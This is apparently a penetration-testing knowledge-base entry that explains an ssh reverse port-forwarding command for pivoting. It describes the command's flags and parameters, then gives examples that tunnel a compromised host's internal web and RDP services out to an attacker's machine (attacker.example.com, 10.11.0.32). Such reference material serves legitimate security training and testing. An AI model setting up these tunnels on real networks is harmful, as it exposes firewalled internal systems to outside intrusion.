---
type: command
executor: bash
data: >-
  ssh -fNT -R $_BIND_ADDRESS:$_REMOTE_PORT:$_FORWARD_HOST:$_FORWARD_PORT
  $_USER@$_REMOTE_HOST
output: null
platforms:
  - Linux
  - Unix
tags:
  - ssh
  - tunneling
  - pivoting
verified: true
validated: true
---

# ssh-reverse-port-forwarding

## Command

```bash
ssh -fNT -R $_BIND_ADDRESS:$_REMOTE_PORT:$_FORWARD_HOST:$_FORWARD_PORT $_USER@$_REMOTE_HOST
```

## Description

This command creates a reverse SSH tunnel from the executing host (e.g., compromised machine) to a remote SSH server (e.g., attacker's machine), binding a port on the remote server to forward connections to an internal host and port visible from the client. Use this during lateral movement to access firewalled services. The -f flag backgrounds the process, -N prevents executing a remote command, and -T disables pseudo-terminal allocation for clean tunneling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_BIND_ADDRESS | IP address to bind the remote port to (e.g., 0.0.0.0 for all interfaces, 127.0.0.1 for localhost only) | Yes |
| $_REMOTE_PORT | Port number to bind and listen on the remote SSH server | Yes |
| $_FORWARD_HOST | Hostname or IP address (from client's perspective) to forward connections to (e.g., internal server IP) | Yes |
| $_FORWARD_PORT | Port number on the forward host to connect to (e.g., 3389 for RDP) | Yes |
| $_USER | Username for authenticating to the remote SSH server | Yes |
| $_REMOTE_HOST | IP address or hostname of the remote SSH server (attacker's machine) | Yes |
| -f | Forks the process into the background after authentication | Built-in |
| -N | Do not execute a remote command (pure forwarding mode) | Built-in |
| -T | Disable pseudo-terminal allocation | Built-in |
| -R | Specifies remote port forwarding | Built-in |

## Examples

### Basic Usage

Forward a web service from an internal host:
```bash
ssh -fNT -R 0.0.0.0:8080:192.168.1.100:80 user@attacker.example.com
```

### Advanced Usage (RDP Forwarding Example)

Forward an internal RDP server:
```bash
ssh -fNT -R 0.0.0.0:3389:10.1.1.224:3389 root@10.11.0.32
```
After running, connect from attacker: `rdesktop localhost:3389`.

## Expected Output

If successful with -fN, the command returns immediately to the shell prompt with no stdout. Errors appear as stderr messages (e.g., "Permission denied" for auth failure, "Connection refused" for network issues). Verify with `ps` on client or `ss -tlnp` on server showing the bound port.

## Related

- [[procedures/Establish-Reverse-SSH-Tunnel-for-Remote-Port-Forwarding]]
- [[tools/OpenSSH]]
